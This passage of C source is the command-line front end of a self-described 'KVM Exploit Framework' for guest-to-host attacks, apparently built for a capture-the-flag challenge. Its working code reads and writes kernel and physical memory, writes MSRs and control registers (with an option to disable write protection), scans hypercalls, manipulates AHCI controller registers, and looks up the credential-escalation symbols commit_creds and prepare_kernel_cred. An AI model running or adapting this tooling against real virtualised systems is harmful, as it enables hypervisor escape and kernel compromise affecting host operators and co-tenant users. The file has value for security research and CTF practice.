        LOG_ERR("virt_to_pfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.pfn);
    else printf("Virtual 0x%lx -> PFN 0x%lx\n", vaddr, req.pfn);
    return 0;
}

static int cmd_gpa_to_hva(unsigned long gpa)
{
    struct gpa_to_hva_request req = {0};
    
    if (open_device() < 0) return -1;
    req.gpa = gpa;
    
    if (ioctl(g_fd, IOCTL_GPA_TO_HVA, &req) < 0) {
        LOG_ERR("gpa_to_hva failed");
        return -1;
    }
    
    printf("GPA 0x%lx -> HVA 0x%lx (GFN 0x%lx)\n", gpa, req.hva, req.gfn);
    return 0;
}

static int cmd_gpa_to_gfn(unsigned long gpa)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = gpa;
    
    if (ioctl(g_fd, IOCTL_GPA_TO_GFN, &req) < 0) {
        LOG_ERR("gpa_to_gfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("GPA 0x%lx -> GFN 0x%lx\n", gpa, req.output_addr);
    return 0;
}

static int cmd_gfn_to_gpa(unsigned long gfn)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = gfn;
    
    if (ioctl(g_fd, IOCTL_GFN_TO_GPA, &req) < 0) {
        LOG_ERR("gfn_to_gpa failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("GFN 0x%lx -> GPA 0x%lx\n", gfn, req.output_addr);
    return 0;
}

static int cmd_gfn_to_hva(unsigned long gfn)
{
    struct gfn_to_hva_request req = {0};
    
    if (open_device() < 0) return -1;
    req.gfn = gfn;
    
    if (ioctl(g_fd, IOCTL_GFN_TO_HVA, &req) < 0) {
        LOG_ERR("gfn_to_hva failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.hva);
    else printf("GFN 0x%lx -> HVA 0x%lx\n", gfn, req.hva);
    return 0;
}

static int cmd_gfn_to_pfn(unsigned long gfn)
{
    struct gfn_to_pfn_request req = {0};
    
    if (open_device() < 0) return -1;
    req.gfn = gfn;
    
    if (ioctl(g_fd, IOCTL_GFN_TO_PFN, &req) < 0) {
        LOG_ERR("gfn_to_pfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.pfn);
    else printf("GFN 0x%lx -> PFN 0x%lx\n", gfn, req.pfn);
    return 0;
}

static int cmd_hva_to_pfn(unsigned long hva, int writable)
{
    struct hva_to_pfn_request req = {0};
    
    if (open_device() < 0) return -1;
    req.hva = hva;
    req.writable = writable;
    
    if (ioctl(g_fd, IOCTL_HVA_TO_PFN, &req) < 0) {
        LOG_ERR("hva_to_pfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.pfn);
    else printf("HVA 0x%lx -> PFN 0x%lx\n", hva, req.pfn);
    return 0;
}

static int cmd_hva_to_gfn(unsigned long hva)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = hva;
    
    if (ioctl(g_fd, IOCTL_HVA_TO_GFN, &req) < 0) {
        LOG_ERR("hva_to_gfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("HVA 0x%lx -> GFN 0x%lx\n", hva, req.output_addr);
    return 0;
}

static int cmd_pfn_to_hva(unsigned long pfn)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = pfn;
    
    if (ioctl(g_fd, IOCTL_PFN_TO_HVA, &req) < 0) {
        LOG_ERR("pfn_to_hva failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("PFN 0x%lx -> HVA 0x%lx\n", pfn, req.output_addr);
    return 0;
}

static int cmd_page_to_pfn(unsigned long page)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = page;
    
    if (ioctl(g_fd, IOCTL_PAGE_TO_PFN, &req) < 0) {
        LOG_ERR("page_to_pfn failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("Page 0x%lx -> PFN 0x%lx\n", page, req.output_addr);
    return 0;
}

static int cmd_pfn_to_page(unsigned long pfn)
{
    struct addr_conv_request req = {0};
    
    if (open_device() < 0) return -1;
    req.input_addr = pfn;
    
    if (ioctl(g_fd, IOCTL_PFN_TO_PAGE, &req) < 0) {
        LOG_ERR("pfn_to_page failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.output_addr);
    else printf("PFN 0x%lx -> Page 0x%lx\n", pfn, req.output_addr);
    return 0;
}

static int cmd_walk_ept(unsigned long eptp, unsigned long gpa)
{
    struct ept_walk_request req = {0};
    
    if (open_device() < 0) return -1;
    req.eptp = eptp;
    req.gpa = gpa;
    
    if (ioctl(g_fd, IOCTL_WALK_EPT, &req) < 0) {
        LOG_ERR("EPT walk failed");
        return -1;
    }
    
    printf("EPT Walk (EPTP=0x%lx, GPA=0x%lx):\n", eptp, gpa);
    printf("  PML4E: 0x%016lx\n", req.pml4e);
    printf("  PDPTE: 0x%016lx\n", req.pdpte);
    printf("  PDE:   0x%016lx\n", req.pde);
    printf("  PTE:   0x%016lx\n", req.pte);
    printf("  HPA:   0x%016lx\n", req.hpa);
    printf("  Size:  %d bytes\n", req.page_size);
    return 0;
}

static int cmd_spte_to_pfn(unsigned long spte)
{
    struct spte_to_pfn_request req = {0};
    
    if (open_device() < 0) return -1;
    req.spte = spte;
    
    if (ioctl(g_fd, IOCTL_SPTE_TO_PFN, &req) < 0) {
        LOG_ERR("SPTE to PFN failed");
        return -1;
    }
    
    printf("SPTE 0x%lx:\n", spte);
    printf("  PFN:        0x%lx\n", req.pfn);
    printf("  Flags:      0x%lx\n", req.flags);
    printf("  Present:    %d\n", req.present);
    printf("  Writable:   %d\n", req.writable);
    printf("  Executable: %d\n", req.executable);
    return 0;
}

static int cmd_translate_gva(unsigned long gva, unsigned long cr3, int access)
{
    struct gva_translate_request req = {0};
    
    if (open_device() < 0) return -1;
    req.gva = gva;
    req.cr3 = cr3;
    req.access_type = access;
    
    if (ioctl(g_fd, IOCTL_TRANSLATE_GVA, &req) < 0) {
        LOG_ERR("GVA translation failed");
        return -1;
    }
    
    printf("GVA Translation (CR3=0x%lx):\n", cr3);
    printf("  GVA: 0x%016lx\n", req.gva);
    printf("  GPA: 0x%016lx\n", req.gpa);
    printf("  HVA: 0x%016lx\n", req.hva);
    printf("  HPA: 0x%016lx\n", req.hpa);
    return 0;
}

/* ============================================================================
 * Cache Operations
 * ============================================================================ */

static int cmd_wbinvd(void)
{
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_WBINVD, NULL) < 0) {
        LOG_ERR("WBINVD failed");
        return -1;
    }
    LOG_OK("Cache writeback and invalidate complete");
    return 0;
}

static int cmd_clflush(unsigned long addr)
{
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_CLFLUSH, &addr) < 0) {
        LOG_ERR("CLFLUSH failed");
        return -1;
    }
    LOG_OK("Cache line flushed at 0x%lx", addr);
    return 0;
}

/* ============================================================================
 * Hypercall Operations
 * ============================================================================ */

static int cmd_hypercall(uint64_t nr, uint64_t a0, uint64_t a1, 
                         uint64_t a2, uint64_t a3)
{
    struct hypercall_request req = {0};
    
    if (open_device() < 0) return -1;
    req.nr = nr;
    req.a0 = a0;
    req.a1 = a1;
    req.a2 = a2;
    req.a3 = a3;
    
    if (ioctl(g_fd, IOCTL_HYPERCALL, &req) < 0) {
        LOG_ERR("Hypercall failed");
        return -1;
    }
    
    if (g_raw_output) {
        printf("0x%lx\n", req.result);
    } else {
        printf("HC %lu(0x%lx, 0x%lx, 0x%lx, 0x%lx) = 0x%lx (%ld)\n",
               nr, a0, a1, a2, a3, req.result, (long)req.result);
        
        /* Try ASCII interpretation */
        unsigned char *b = (unsigned char *)&req.result;
        int printable = 1;
        for (int i = 0; i < 8 && b[i]; i++) {
            if (b[i] < 0x20 || b[i] > 0x7e) { printable = 0; break; }
        }
        if (printable && b[0]) {
            printf("  ASCII: \"%.8s\"\n", b);
        }
    }
    return 0;
}

static int cmd_hypercall_batch(void)
{
    struct hypercall_batch_request req = {0};
    
    if (open_device() < 0) return -1;
    
    if (ioctl(g_fd, IOCTL_HYPERCALL_BATCH, &req) < 0) {
        LOG_ERR("Hypercall batch failed");
        return -1;
    }
    
    if (g_json_output) {
        printf("{\"hc100\":\"0x%lx\",\"hc101\":\"0x%lx\","
               "\"hc102\":\"0x%lx\",\"hc103\":\"0x%lx\"}\n",
               req.r100, req.r101, req.r102, req.r103);
    } else {
        printf("CTF Hypercall Batch (100-103):\n");
        printf("  HC 100: 0x%016lx (%ld)\n", req.r100, (long)req.r100);
        printf("  HC 101: 0x%016lx (%ld)\n", req.r101, (long)req.r101);
        printf("  HC 102: 0x%016lx (%ld)\n", req.r102, (long)req.r102);
        printf("  HC 103: 0x%016lx (%ld)\n", req.r103, (long)req.r103);
    }
    return 0;
}

static int cmd_hypercall_detect(void)
{
    int type = 0;
    
    if (open_device() < 0) return -1;
    
    if (ioctl(g_fd, IOCTL_HYPERCALL_DETECT, &type) < 0) {
        LOG_ERR("Hypercall detect failed");
        return -1;
    }
    
    if (g_raw_output) {
        printf("%d\n", type);
    } else {
        printf("Hypercall type: %d (%s)\n", type,
               type == 1 ? "VMCALL (Intel VMX)" :
               type == 2 ? "VMMCALL (AMD SVM)" : "Unknown");
    }
    return 0;
}

static int cmd_hypercall_scan(uint64_t start, uint64_t end)
{
    struct hypercall_request req;
    int found = 0;
    
    if (open_device() < 0) return -1;
    
    LOG_OK("Scanning hypercalls %lu - %lu...", start, end);
    
    for (uint64_t nr = start; nr <= end; nr++) {
        memset(&req, 0, sizeof(req));
        req.nr = nr;
        
        if (ioctl(g_fd, IOCTL_HYPERCALL, &req) < 0) continue;
        
        /* Filter common "not implemented" values */
        if (req.result == (uint64_t)-1 ||
            req.result == (uint64_t)-38 ||  /* ENOSYS */
            req.result == (uint64_t)-22) {  /* EINVAL */
            continue;
        }
        
        printf("  HC %3lu: 0x%016lx", nr, req.result);
        if (req.result != 0) {
            unsigned char *b = (unsigned char *)&req.result;
            int printable = 1;
            for (int i = 0; i < 8 && b[i]; i++) {
                if (b[i] < 0x20 || b[i] > 0x7e) { printable = 0; break; }
            }
            if (printable && b[0]) printf(" \"%.8s\"", b);
        }
        printf("\n");
        found++;
    }
    
    LOG_OK("Found %d potentially interesting hypercalls", found);
    return found;
}

/* ============================================================================
 * AHCI Operations
 * ============================================================================ */

static int cmd_ahci_init(void)
{
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_AHCI_INIT, NULL) < 0) {
        LOG_ERR("AHCI init failed");
        return -1;
    }
    LOG_OK("AHCI controller initialized");
    return 0;
}

static int cmd_ahci_info(void)
{
    struct ahci_info info = {0};
    
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_AHCI_INFO, &info) < 0) {
        LOG_ERR("AHCI info failed");
        return -1;
    }
    
    printf("AHCI Controller Info:\n");
    printf("  CAP:  0x%08x\n", info.cap);
    printf("  GHC:  0x%08x\n", info.ghc);
    printf("  PI:   0x%08x\n", info.pi);
    printf("  VS:   0x%08x (AHCI %d.%d)\n", info.vs,
           (info.vs >> 16) & 0xFFFF, info.vs & 0xFFFF);
    
    for (int i = 0; i < 6; i++) {
        if (info.pi & (1 << i)) {
            printf("  Port %d: SSTS=0x%08x %s\n", i, info.port_ssts[i],
                   (info.port_ssts[i] & 0xF) == 3 ? "(device)" : "");
        }
    }
    return 0;
}

static int cmd_ahci_read(uint32_t port, uint32_t offset)
{
    struct ahci_reg_request req = {0};
    
    if (open_device() < 0) return -1;
    req.port = port;
    req.offset = offset;
    req.is_write = 0;
    
    if (ioctl(g_fd, IOCTL_AHCI_READ_REG, &req) < 0) {
        LOG_ERR("AHCI read failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%x\n", req.value);
    else printf("AHCI[%u:0x%x] = 0x%08x\n", port, offset, req.value);
    return 0;
}

static int cmd_ahci_write(uint32_t port, uint32_t offset, uint32_t value)
{
    struct ahci_reg_request req = {0};
    
    if (open_device() < 0) return -1;
    req.port = port;
    req.offset = offset;
    req.value = value;
    req.is_write = 1;
    
    if (ioctl(g_fd, IOCTL_AHCI_WRITE_REG, &req) < 0) {
        LOG_ERR("AHCI write failed");
        return -1;
    }
    
    LOG_OK("AHCI[%u:0x%x] <- 0x%08x", port, offset, value);
    return 0;
}

static int cmd_ahci_set_fis(uint32_t port, uint64_t fis, uint64_t clb)
{
    struct ahci_fis_request req = {0};
    
    if (open_device() < 0) return -1;
    req.port = port;
    req.fis_base = fis;
    req.clb_base = clb;
    
    if (ioctl(g_fd, IOCTL_AHCI_SET_FIS_BASE, &req) < 0) {
        LOG_ERR("AHCI set FIS base failed");
        return -1;
    }
    
    LOG_OK("Port %u: FIS=0x%lx CLB=0x%lx", port, fis, clb);
    return 0;
}

/* ============================================================================
 * Compound/CTF Operations
 * ============================================================================ */

static int cmd_full_recon(void)
{
    LOG_OK("=== Full System Reconnaissance ===\n");
    
    printf("\n--- KASLR Info ---\n");
    cmd_kaslr_info();
    
    printf("\n--- Control Registers ---\n");
    cmd_read_cr(0);
    cmd_read_cr(3);
    cmd_read_cr(4);
    
    printf("\n--- Hypercall Detection ---\n");
    cmd_hypercall_detect();
    
    printf("\n--- CTF Hypercalls ---\n");
    cmd_hypercall_batch();
    
    printf("\n--- Key Symbols ---\n");
    const char *syms[] = {"init_task", "prepare_kernel_cred", "commit_creds",
                          "kvm_vcpu_read_guest", "vmx_vcpu_run", NULL};
    for (int i = 0; syms[i]; i++) {
        cmd_lookup_symbol(syms[i]);
    }
    
    return 0;
}

static int cmd_hunt_flags(unsigned long start, size_t size)
{
    const char *patterns[] = {"flag{", "FLAG{", "CTF{", "ctf{", NULL};
    unsigned char *buf;
    size_t chunk = 4 * 1024 * 1024;
    int found = 0;
    
    if (open_device() < 0) return -1;
    buf = malloc(chunk);
    if (!buf) return -1;
    
    LOG_OK("Hunting for flags in 0x%lx - 0x%lx...", start, start + size);
    
    for (unsigned long addr = start; addr < start + size; addr += chunk) {
        struct physical_mem_read req;
        size_t read_size = (addr + chunk > start + size) ? 
                           (start + size - addr) : chunk;
        
        req.phys_addr = addr;
        req.length = read_size;
        req.user_buffer = buf;
        
        if (ioctl(g_fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) continue;
        
        for (size_t i = 0; i < read_size - 8; i++) {
            for (int p = 0; patterns[p]; p++) {
                if (memcmp(buf + i, patterns[p], strlen(patterns[p])) == 0) {
                    printf(C_GREEN "\n[FLAG] " C_RESET "0x%lx: ", addr + i);
                    for (size_t j = i; j < i + 64 && j < read_size; j++) {
                        if (buf[j] >= 0x20 && buf[j] < 0x7f) printf("%c", buf[j]);
                        else break;
                    }
                    printf("\n");
                    found++;
                }
            }
        }
        
        /* Progress */
        if (!g_quiet && ((addr - start) % (64 * 1024 * 1024) == 0)) {
            fprintf(stderr, "\r  Scanned %lu MB...", (addr - start) / (1024*1024));
        }
    }
    
    if (!g_quiet) fprintf(stderr, "\n");
    LOG_OK("Found %d flag candidates", found);
    
    free(buf);
    return found;
}

/* ============================================================================
 * Main / CLI
 * ============================================================================ */

static void print_usage(const char *prog)
{
    printf(C_BOLD "KVM Exploit Framework v2.0" C_RESET " - Complete Guest-to-Host Toolkit\n\n");
    printf("Usage: %s [options] <command> [arguments]\n\n", prog);
    
    printf(C_CYAN "Symbol Operations:\n" C_RESET);
    printf("  sym <name>                  Lookup kernel symbol\n");
    printf("  sym-count                   Get KVM symbol count\n");
    printf("  sym-list                    List all KVM symbols\n");
    printf("  sym-search <pattern>        Search symbols by pattern\n");
    printf("  vmx-handlers                List Intel VMX exit handlers\n");
    printf("  svm-handlers                List AMD SVM exit handlers\n");
    
    printf(C_CYAN "\nMemory Read Operations:\n" C_RESET);
    printf("  rk <addr> [len]             Read kernel memory\n");
    printf("  rp <addr> [len]             Read physical memory\n");
    printf("  rg <addr> [len] [mode]      Read guest memory (mode: 0=GPA,1=GVA,2=GFN)\n");
    printf("  rpfn <pfn> [len]            Read data at PFN\n");
    printf("  scan <start> <end> [step]   Scan memory region\n");
    printf("  find <start> <end> <hex>    Find pattern in memory\n");
    printf("  cr <n>                      Read CR register (0,2,3,4)\n");
    printf("  msr <reg>                   Read MSR\n");
    printf("  pt <vaddr>                  Dump page tables for address\n");
    printf("  kaslr                       Show KASLR information\n");
    
    printf(C_CYAN "\nMemory Write Operations:\n" C_RESET);
    printf("  wk <addr> <hex> [no-wp]     Write kernel memory (no-wp disables WP)\n");
    printf("  wp <addr> <hex> [method]    Write physical memory\n");
    printf("  wg <addr> <hex> [mode]      Write guest memory\n");
    printf("  wmsr <reg> <val>            Write MSR\n");
    printf("  wcr <n> <val> [mask]        Write CR register\n");
    printf("  memset-k <addr> <val> <len> Memset kernel memory\n");
    printf("  memset-p <addr> <val> <len> Memset physical memory\n");
    printf("  patch <addr> <hex> [orig]   Patch bytes (verify orig if provided)\n");
    printf("  wflush <addr> <hex>         Write and flush cache\n");
    
    printf(C_CYAN "\nAddress Conversions:\n" C_RESET);
    printf("  v2p <vaddr>                 Virtual to physical\n");
    printf("  p2v <paddr> [ioremap]       Physical to virtual\n");
    printf("  v2pfn <vaddr>               Virtual to PFN\n");
    printf("  gpa2hva <gpa>               GPA to HVA\n");
    printf("  gpa2gfn <gpa>               GPA to GFN\n");
    printf("  gfn2gpa <gfn>               GFN to GPA\n");
    printf("  gfn2hva <gfn>               GFN to HVA\n");
    printf("  gfn2pfn <gfn>               GFN to PFN\n");
    printf("  hva2pfn <hva> [writable]    HVA to PFN\n");
    printf("  hva2gfn <hva>               HVA to GFN\n");
    printf("  pfn2hva <pfn>               PFN to HVA\n");
    printf("  page2pfn <page>             Page struct to PFN\n");
    printf("  pfn2page <pfn>              PFN to page struct\n");
    printf("  ept <eptp> <gpa>            Walk EPT tables\n");
    printf("  spte <spte>                 Decode SPTE\n");
    printf("  gva <gva> <cr3> [access]    Translate GVA\n");
    
    printf(C_CYAN "\nCache Operations:\n" C_RESET);
    printf("  wbinvd                      Writeback and invalidate all caches\n");
    printf("  clflush <addr>              Flush cache line\n");
    
    printf(C_CYAN "\nHypercalls:\n" C_RESET);
    printf("  hc <nr> [a0] [a1] [a2] [a3] Execute hypercall\n");
    printf("  hc-batch                    Execute CTF hypercalls 100-103\n");
    printf("  hc-detect                   Detect hypercall type\n");
    printf("  hc-scan <start> <end>       Scan hypercall range\n");
    
    printf(C_CYAN "\nAHCI Operations:\n" C_RESET);
    printf("  ahci-init                   Initialize AHCI\n");
    printf("  ahci-info                   Show AHCI info\n");
    printf("  ahci-read <port> <off>      Read AHCI register\n");
    printf("  ahci-write <p> <off> <val>  Write AHCI register\n");
    printf("  ahci-fis <port> <fis> <clb> Set FIS/CLB base\n");
    
    printf(C_CYAN "\nCTF/Exploit Commands:\n" C_RESET);
    printf("  recon                       Full system reconnaissance\n");
    printf("  hunt [start] [size]         Hunt for flags in physical memory\n");
    
    printf(C_CYAN "\nOptions:\n" C_RESET);
    printf("  -v, --verbose               Verbose output\n");
    printf("  -q, --quiet                 Quiet mode\n");
    printf("  -r, --raw                   Raw output (for scripting)\n");
    printf("  -j, --json                  JSON output\n");
    printf("  -h, --help                  Show this help\n");
    printf("\n");
}

int main(int argc, char *argv[])
{
    int opt;
    static struct option long_opts[] = {
        {"verbose", no_argument, 0, 'v'},
        {"quiet", no_argument, 0, 'q'},
        {"raw", no_argument, 0, 'r'},
        {"json", no_argument, 0, 'j'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    while ((opt = getopt_long(argc, argv, "vqrjh", long_opts, NULL)) != -1) {
        switch (opt) {
            case 'v': g_verbose = 1; break;
            case 'q': g_quiet = 1; break;
            case 'r': g_raw_output = 1; break;
            case 'j': g_json_output = 1; break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }
    
    if (optind >= argc) {
        print_usage(argv[0]);
        return 1;
    }
    
    const char *cmd = argv[optind];
    char *a1 = (optind + 1 < argc) ? argv[optind + 1] : NULL;
    char *a2 = (optind + 2 < argc) ? argv[optind + 2] : NULL;
    char *a3 = (optind + 3 < argc) ? argv[optind + 3] : NULL;
    char *a4 = (optind + 4 < argc) ? argv[optind + 4] : NULL;
    char *a5 = (optind + 5 < argc) ? argv[optind + 5] : NULL;
    
    int ret = 0;
    
    /* Symbol operations */
    if (strcmp(cmd, "sym") == 0 && a1) ret = cmd_lookup_symbol(a1) ? 0 : 1;
    else if (strcmp(cmd, "sym-count") == 0) ret = cmd_symbol_count() < 0 ? 1 : 0;
    else if (strcmp(cmd, "sym-list") == 0) ret = cmd_list_symbols();
    else if (strcmp(cmd, "sym-search") == 0 && a1) ret = cmd_search_symbol(a1);
    else if (strcmp(cmd, "vmx-handlers") == 0) ret = cmd_vmx_handlers();
    else if (strcmp(cmd, "svm-handlers") == 0) ret = cmd_svm_handlers();
    
    /* Memory read */
    else if (strcmp(cmd, "rk") == 0 && a1) 
        ret = cmd_read_kernel(parse_addr(a1), a2 ? parse_size(a2) : 64);
    else if (strcmp(cmd, "rp") == 0 && a1)
        ret = cmd_read_physical(parse_addr(a1), a2 ? parse_size(a2) : 64);
    else if (strcmp(cmd, "rg") == 0 && a1)
        ret = cmd_read_guest(parse_addr(a1), a2 ? parse_size(a2) : 64, a3 ? atoi(a3) : 0);
    else if (strcmp(cmd, "rpfn") == 0 && a1)
        ret = cmd_read_pfn(parse_addr(a1), a2 ? parse_size(a2) : 64);
    else if (strcmp(cmd, "scan") == 0 && a1 && a2)
        ret = cmd_scan_region(parse_addr(a1), parse_addr(a2), a3 ? parse_size(a3) : 0, 0);
    else if (strcmp(cmd, "find") == 0 && a1 && a2 && a3)
        ret = cmd_find_pattern(parse_addr(a1), parse_addr(a2), a3);
    else if (strcmp(cmd, "cr") == 0 && a1) ret = cmd_read_cr(atoi(a1));
    else if (strcmp(cmd, "msr") == 0 && a1) ret = cmd_read_msr(parse_addr(a1));
    else if (strcmp(cmd, "pt") == 0 && a1) ret = cmd_dump_pagetables(parse_addr(a1));
    else if (strcmp(cmd, "kaslr") == 0) ret = cmd_kaslr_info();
    
    /* Memory write */
    else if (strcmp(cmd, "wk") == 0 && a1 && a2)
        ret = cmd_write_kernel(parse_addr(a1), a2, a3 ? 1 : 0);
    else if (strcmp(cmd, "wp") == 0 && a1 && a2)
        ret = cmd_write_physical(parse_addr(a1), a2, a3 ? atoi(a3) : 0);
    else if (strcmp(cmd, "wg") == 0 && a1 && a2)
        ret = cmd_write_guest(parse_addr(a1), a2, a3 ? atoi(a3) : 0);
    else if (strcmp(cmd, "wmsr") == 0 && a1 && a2)
        ret = cmd_write_msr(parse_addr(a1), parse_addr(a2));
    else if (strcmp(cmd, "wcr") == 0 && a1 && a2)
        ret = cmd_write_cr(atoi(a1), parse_addr(a2), a3 ? parse_addr(a3) : 0);
    else if (strcmp(cmd, "memset-k") == 0 && a1 && a2 && a3)
        ret = cmd_memset_kernel(parse_addr(a1), atoi(a2), parse_size(a3));
    else if (strcmp(cmd, "memset-p") == 0 && a1 && a2 && a3)
        ret = cmd_memset_physical(parse_addr(a1), atoi(a2), parse_size(a3));
    else if (strcmp(cmd, "patch") == 0 && a1 && a2)
        ret = cmd_patch(parse_addr(a1), a3, a2, 0);
    else if (strcmp(cmd, "wflush") == 0 && a1 && a2)
        ret = cmd_write_and_flush(parse_addr(a1), a2, 0);
    
    /* Address conversions */
    else if (strcmp(cmd, "v2p") == 0 && a1) ret = cmd_virt_to_phys(parse_addr(a1));
    else if (strcmp(cmd, "p2v") == 0 && a1) ret = cmd_phys_to_virt(parse_addr(a1), a2 ? 1 : 0);
    else if (strcmp(cmd, "v2pfn") == 0 && a1) ret = cmd_virt_to_pfn(parse_addr(a1));
    else if (strcmp(cmd, "gpa2hva") == 0 && a1) ret = cmd_gpa_to_hva(parse_addr(a1));
    else if (strcmp(cmd, "gpa2gfn") == 0 && a1) ret = cmd_gpa_to_gfn(parse_addr(a1));
    else if (strcmp(cmd, "gfn2gpa") == 0 && a1) ret = cmd_gfn_to_gpa(parse_addr(a1));
    else if (strcmp(cmd, "gfn2hva") == 0 && a1) ret = cmd_gfn_to_hva(parse_addr(a1));
    else if (strcmp(cmd, "gfn2pfn") == 0 && a1) ret = cmd_gfn_to_pfn(parse_addr(a1));
    else if (strcmp(cmd, "hva2pfn") == 0 && a1) ret = cmd_hva_to_pfn(parse_addr(a1), a2 ? 1 : 0);
    else if (strcmp(cmd, "hva2gfn") == 0 && a1) ret = cmd_hva_to_gfn(parse_addr(a1));
    else if (strcmp(cmd, "pfn2hva") == 0 && a1) ret = cmd_pfn_to_hva(parse_addr(a1));
    else if (strcmp(cmd, "page2pfn") == 0 && a1) ret = cmd_page_to_pfn(parse_addr(a1));
    else if (strcmp(cmd, "pfn2page") == 0 && a1) ret = cmd_pfn_to_page(parse_addr(a1));
    else if (strcmp(cmd, "ept") == 0 && a1 && a2)
        ret = cmd_walk_ept(parse_addr(a1), parse_addr(a2));
    else if (strcmp(cmd, "spte") == 0 && a1) ret = cmd_spte_to_pfn(parse_addr(a1));
    else if (strcmp(cmd, "gva") == 0 && a1 && a2)
        ret = cmd_translate_gva(parse_addr(a1), parse_addr(a2), a3 ? atoi(a3) : 0);
    
    /* Cache */
    else if (strcmp(cmd, "wbinvd") == 0) ret = cmd_wbinvd();
    else if (strcmp(cmd, "clflush") == 0 && a1) ret = cmd_clflush(parse_addr(a1));
    
    /* Hypercalls */
    else if (strcmp(cmd, "hc") == 0 && a1)
        ret = cmd_hypercall(parse_addr(a1), 
                           a2 ? parse_addr(a2) : 0,
                           a3 ? parse_addr(a3) : 0,
                           a4 ? parse_addr(a4) : 0,
                           a5 ? parse_addr(a5) : 0);
    else if (strcmp(cmd, "hc-batch") == 0) ret = cmd_hypercall_batch();
    else if (strcmp(cmd, "hc-detect") == 0) ret = cmd_hypercall_detect();
    else if (strcmp(cmd, "hc-scan") == 0 && a1 && a2)
        ret = cmd_hypercall_scan(parse_addr(a1), parse_addr(a2));
    
    /* AHCI */
    else if (strcmp(cmd, "ahci-init") == 0) ret = cmd_ahci_init();
    else if (strcmp(cmd, "ahci-info") == 0) ret = cmd_ahci_info();
    else if (strcmp(cmd, "ahci-read") == 0 && a1 && a2)
        ret = cmd_ahci_read(atoi(a1), parse_addr(a2));
    else if (strcmp(cmd, "ahci-write") == 0 && a1 && a2 && a3)
        ret = cmd_ahci_write(atoi(a1), parse_addr(a2), parse_addr(a3));
    else if (strcmp(cmd, "ahci-fis") == 0 && a1 && a2 && a3)
        ret = cmd_ahci_set_fis(atoi(a1), parse_addr(a2), parse_addr(a3));
    
    /* CTF/Exploit */
    else if (strcmp(cmd, "recon") == 0) ret = cmd_full_recon();
    else if (strcmp(cmd, "hunt") == 0)
        ret = cmd_hunt_flags(a1 ? parse_addr(a1) : 0, 
                            a2 ? parse_size(a2) : 256*1024*1024);
    
    else {
        LOG_ERR("Unknown command: %s", cmd);
        print_usage(argv[0]);
        ret = 1;
    }
    
    close_device();
    return ret;
}